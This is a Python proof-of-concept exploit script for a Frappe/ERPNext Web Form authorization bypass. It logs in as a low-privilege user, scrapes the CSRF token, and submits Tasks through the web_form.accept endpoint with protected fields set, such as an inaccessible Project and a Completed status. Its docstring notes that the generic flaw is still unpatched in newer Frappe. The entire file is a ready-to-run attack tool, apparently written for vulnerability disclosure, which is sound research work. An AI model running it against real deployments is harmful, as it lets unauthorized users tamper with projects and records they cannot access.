#!/usr/bin/env python3
"""Frappe Web Form protected-field authorization bypass (FRAPPE-07).

ERPNext's stock `tasks` Web Form is published and login-required, but
`web_form.accept` writes the fields it receives without re-checking that the
submitting user may set them. A low-privilege System User can therefore submit a
Task carrying a `project` they cannot otherwise access and a `status` the form
does not offer (for example `Completed`), reaching fields the UI hides. If the
Project uses Task Completion, a completed Task can even flip the Project's status.

This client signs in as the low-privilege account, obtains its CSRF token, submits
the Task with the protected values, and prints the inserted Task. Reviewed against
Frappe 16.29.0 / ERPNext 16.30.0.

Fix status: the demonstrated Task/Project route is blocked in ERPNext 16.32.0 /
15.119.1, but the generic Web Form protected-field sink is unchanged (Frappe
16.51.0), so other target DocTypes remain exposed.
"""

from __future__ import annotations

import argparse
import http.cookiejar
import json
import os
import re
import ssl
import sys
import urllib.error
import urllib.parse
import urllib.request
from typing import Any


ACCEPT_RPC = "/api/method/frappe.website.doctype.web_form.web_form.accept"
LOGGED_USER_RPC = "/api/method/frappe.auth.get_logged_user"
CSRF_RE = re.compile(rb'frappe\.csrf_token\s*=\s*"([^"<>]+)"')
RESERVED_FIELDS = {"name", "doctype", "project", "subject", "status", "priority"}


class PocError(RuntimeError):
    pass


# --- terminal UI ---
_BANNER = r"""
 _____ ____      _    ____  ____  _____
|  ___|  _ \    / \  |  _ \|  _ \| ____|
| |_  | |_) |  / _ \ | |_) | |_) |  _|
|  _| |  _ <  / ___ \|  __/|  __/| |___
|_|   |_| \_\/_/   \_\_|   |_|   |_____|
"""
_COLOR = sys.stderr.isatty() and os.environ.get("NO_COLOR") is None


def _paint(code: str, text: str) -> str:
    return f"\033[{code}m{text}\033[0m" if _COLOR else text


def disable_color() -> None:
    global _COLOR
    _COLOR = False


def banner(subtitle: str) -> None:
    sys.stderr.write(_paint("36", _BANNER.strip("\n")) + "\n")
    sys.stderr.write("  " + _paint("2", subtitle) + "\n")
    sys.stderr.write("  " + _paint("2", "discovered by CryptoCat · cryptocat.me") + "\n\n")


def info(msg: str) -> None:
    sys.stderr.write(f" {_paint('36', '[*]')} {msg}\n")


def good(msg: str) -> None:
    sys.stderr.write(f" {_paint('32', '[+]')} {msg}\n")


def warn(msg: str) -> None:
    sys.stderr.write(f" {_paint('33', '[!]')} {msg}\n")


def bad(msg: str) -> None:
    sys.stderr.write(f" {_paint('31', '[-]')} {msg}\n")


def rule() -> None:
    sys.stderr.write(_paint("2", "  " + "-" * 60) + "\n")
# --- end terminal UI ---


class NoRedirect(urllib.request.HTTPRedirectHandler):
    def redirect_request(self, req, fp, code, msg, headers, newurl):  # noqa: ANN001
        return None


class Client:
    def __init__(self, url: str, timeout: float, insecure: bool, site: str | None) -> None:
        try:
            parsed = urllib.parse.urlsplit(url.strip().rstrip("/"))
            _ = parsed.port
        except ValueError as exc:
            raise PocError(f"invalid --url: {exc}") from exc
        if parsed.scheme not in {"http", "https"} or not parsed.hostname:
            raise PocError("--url must be an http(s) Frappe site URL")
        if parsed.query or parsed.fragment or parsed.username or parsed.password:
            raise PocError("--url must not contain userinfo, a query, or a fragment")
        self.url = urllib.parse.urlunsplit(
            (parsed.scheme, parsed.netloc, parsed.path.rstrip("/"), "", "")
        )
        self.timeout = timeout
        self.site = site
        context = ssl.create_default_context()
        if insecure:
            context.check_hostname = False
            context.verify_mode = ssl.CERT_NONE
        self.cookies = http.cookiejar.CookieJar()
        self.opener = urllib.request.build_opener(
            urllib.request.HTTPSHandler(context=context),
            urllib.request.HTTPCookieProcessor(self.cookies),
            NoRedirect(),
        )

    def request(
        self,
        path: str,
        *,
        method: str = "GET",
        data: bytes | None = None,
        headers: dict[str, str] | None = None,
    ) -> tuple[int, bytes]:
        default_headers = {
            "Accept": "application/json",
            "Accept-Language": "en",
            "User-Agent": "frappe-07-web-form-field-authorization-poc",
        }
        if self.site:
            default_headers["X-Frappe-Site-Name"] = self.site
        request = urllib.request.Request(
            self.url + path,
            data=data,
            headers={**default_headers, **(headers or {})},
            method=method,
        )
        try:
            with self.opener.open(request, timeout=self.timeout) as response:
                return int(response.status), response.read()
        except urllib.error.HTTPError as exc:
            return int(exc.code), exc.read()
        except (urllib.error.URLError, TimeoutError, OSError) as exc:
            raise PocError(f"request to {request.full_url} failed: {exc}") from exc


def parse_json(raw: bytes, context: str) -> dict[str, Any]:
    try:
        value = json.loads(raw)
    except (UnicodeDecodeError, json.JSONDecodeError) as exc:
        raise PocError(f"{context} returned a non-JSON response") from exc
    if not isinstance(value, dict):
        raise PocError(f"{context} returned a JSON value other than an object")
    return value


def detail(response: dict[str, Any], raw: bytes) -> str:
    for key in ("exc_type", "exception", "_server_messages", "message"):
        value = response.get(key)
        if isinstance(value, str) and value:
            return value[:500]
    return raw[:500].decode("utf-8", "replace").strip()


def password_from_env(name: str) -> str:
    password = os.environ.get(name)
    if not password:
        raise PocError(f"set the account password in environment variable {name}")
    return password


def login(client: Client, username: str, password: str) -> None:
    body = urllib.parse.urlencode({"usr": username, "pwd": password}).encode()
    status, raw = client.request(
        "/api/method/login",
        method="POST",
        data=body,
        headers={"Content-Type": "application/x-www-form-urlencoded"},
    )
    response = parse_json(raw, "login")
    if status != 200 or response.get("message") not in {"Logged In", "No App"}:
        raise PocError(f"login failed with HTTP {status}: {detail(response, raw)}")
    status, raw = client.request(LOGGED_USER_RPC)
    response = parse_json(raw, "logged-user lookup")
    if status != 200 or response.get("message") != username:
        raise PocError("authenticated session does not match --username")


def initialize_csrf(client: Client) -> str:
    for path in ("/app", "/desk"):
        status, body = client.request(path, headers={"Accept": "text/html"})
        if status == 200 and (match := CSRF_RE.search(body)):
            token = match.group(1).decode("ascii")
            if token and token not in {"None", "null"}:
                return token
    raise PocError("could not obtain a CSRF token through Desk")


def validate_text(value: str, label: str, maximum: int = 140) -> str:
    value = value.strip()
    if not value:
        raise PocError(f"{label} must not be empty")
    if len(value) > maximum:
        raise PocError(f"{label} must be at most {maximum} characters")
    if any(ord(character) < 0x20 or ord(character) == 0x7F for character in value):
        raise PocError(f"{label} must not contain control characters")
    return value


def parse_extra_data(raw: str) -> dict[str, Any]:
    try:
        data = json.loads(raw)
    except json.JSONDecodeError as exc:
        raise PocError(f"--data is not valid JSON: {exc.msg}") from exc
    if not isinstance(data, dict):
        raise PocError("--data must be a JSON object")
    reserved = sorted(set(data) & RESERVED_FIELDS)
    if reserved:
        raise PocError(
            "pass these fields with their dedicated options: " + ", ".join(reserved)
        )
    return data


def submit_task(
    client: Client, csrf: str, document: dict[str, Any]
) -> dict[str, Any]:
    body = urllib.parse.urlencode(
        {
            "web_form": "tasks",
            "data": json.dumps(document, separators=(",", ":"), ensure_ascii=False),
        }
    ).encode()
    status, raw = client.request(
        ACCEPT_RPC,
        method="POST",
        data=body,
        headers={
            "Content-Type": "application/x-www-form-urlencoded",
            "X-Frappe-CSRF-Token": csrf,
        },
    )
    response = parse_json(raw, "Task Web Form submission")
    if status != 200 or response.get("exception") or response.get("exc"):
        raise PocError(
            f"Task Web Form submission failed with HTTP {status}: {detail(response, raw)}"
        )
    created = response.get("message")
    if not isinstance(created, dict) or not created.get("name") or created.get("__islocal"):
        raise PocError("Task Web Form submission did not return an inserted Task")
    return created


def make_parser() -> argparse.ArgumentParser:
    parser = argparse.ArgumentParser(
        description=__doc__,
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="example:\n"
               "  FRAPPE07_PASSWORD=pass %(prog)s --url https://frappe.example \\\n"
               "    --username lowpriv@example --project PROJ-0001 \\\n"
               "    --subject 'Quarterly close' --status Completed\n",
    )
    parser.add_argument("--url", required=True, metavar="URL", help="Frappe site base URL")
    parser.add_argument("--site", metavar="NAME", help="optional X-Frappe-Site-Name value")
    parser.add_argument("--username", required=True, metavar="USER", help="low-privilege System User")
    parser.add_argument("--password-env", default="FRAPPE07_PASSWORD", metavar="VAR", help="env var holding the account password (default: FRAPPE07_PASSWORD)")
    parser.add_argument("--project", required=True, metavar="NAME", help="exact inaccessible Project name")
    parser.add_argument("--subject", required=True, metavar="TEXT", help="subject for the created Task")
    parser.add_argument("--status", required=True, metavar="STATUS", help="protected Task status")
    parser.add_argument("--priority", default="Medium", metavar="PRIO", help="Task priority (default: Medium)")
    parser.add_argument(
        "--data", default="{}", metavar="JSON", help="JSON object containing any additional Task fields"
    )
    parser.add_argument("--timeout", type=float, default=20.0, metavar="SECS", help="HTTP timeout (default: 20)")
    parser.add_argument("--insecure", action="store_true", help="disable TLS certificate verification")
    parser.add_argument("--no-color", action="store_true", help="disable coloured output")
    return parser


def run(args: argparse.Namespace) -> int:
    if args.no_color:
        disable_color()
    banner("Web Form protected-field authorization bypass  ·  FRAPPE-07")
    if args.timeout <= 0:
        raise PocError("--timeout must be greater than zero")
    if args.site and not re.fullmatch(r"[A-Za-z0-9._-]+", args.site):
        raise PocError("--site contains an invalid Frappe site name")
    project = validate_text(args.project, "--project")
    subject = validate_text(args.subject, "--subject")
    status = validate_text(args.status, "--status")
    priority = validate_text(args.priority, "--priority")
    document = parse_extra_data(args.data)
    document.update(
        {
            "project": project,
            "subject": subject,
            "status": status,
            "priority": priority,
        }
    )

    client = Client(args.url, args.timeout, args.insecure, args.site)
    info(f"signing in as the low-privilege user {args.username}")
    login(client, args.username, password_from_env(args.password_env))
    csrf = initialize_csrf(client)
    info(f"submitting a Task into Project {project!r} with status {status!r}")
    created = submit_task(client, csrf, document)
    for field, expected in {
        "project": project,
        "subject": subject,
        "status": status,
    }.items():
        if created.get(field) != expected:
            raise PocError(f"created Task did not preserve {field!r}")

    good(f"created Task {created['name']} in Project {project} with status {status}")
    rule()
    print(json.dumps({"created_task": created}, indent=2, ensure_ascii=False))
    return 0


def main() -> int:
    try:
        return run(make_parser().parse_args())
    except PocError as exc:
        bad(str(exc))
        return 1
    except KeyboardInterrupt:
        bad("interrupted")
        return 130


if __name__ == "__main__":
    raise SystemExit(main())
